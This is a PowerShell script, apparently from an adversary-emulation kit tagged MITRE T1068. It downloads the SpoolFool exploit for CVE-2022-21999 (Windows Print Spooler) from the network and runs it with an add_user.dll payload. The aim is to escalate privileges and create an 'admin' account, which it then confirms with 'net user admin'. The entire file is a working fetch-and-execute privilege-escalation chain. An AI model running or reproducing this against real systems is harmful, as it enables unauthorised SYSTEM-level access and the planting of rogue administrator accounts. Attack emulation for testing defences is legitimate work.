# Downloads and Run SpoolFool
# Exploit for CVE-2022-21999
# Technic ID : T1068
Clear-Host
Write-Output "==============================================================================="
Write-Output "Downloads and use spoolfool.exe  (T1068)"
Write-Output "==============================================================================="
################ [ List of commpiled programs to downlad ] ################
$SoftToDownload = @("SpoolFool.exe")
$DownloadFrom = "https://github.com/ly4k/SpoolFool/blob/main"
################ [ GLOBAL VARIABLES ] ################
$TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
$LogFile = "$env:PUBLIC\exf\Tool_SpoolFool.txt";
$DestinationPath = "$env:PUBLIC\Toolz\";
################ [ MAIN BODY ] ################
Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Force
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "Script : $PSCommandPath has been launched on $TimeStamp" | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
foreach ($Tool in $SoftToDownload) 
{
    $DownloadRun = $DownloadFrom+"/"+$SoftToDownload
    $DestinationFilename = $DestinationPath+"\"+$Tool;
    $web = (New-Object System.Net.WebClient);
    $result = $web.DownloadFile("$DownloadRun", "$DestinationFileName");
    if ([System.IO.File]::Exists("$DestinationFileName")) {
            Write-Output "The file $Tool has been successfully downloaded from $DownloadRun and stored to $DestinationFilename" | Out-File -FilePath "$LogFile" -Append;
            Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
            $LaunchBinary = $DestinationFileName + " -dll add_user.dll"
            Invoke-Expression $LaunchBinary  | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
            #Checks result
            $NetUser = "net user admin"
            Invoke-Expression $NetUser  | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
    }
  }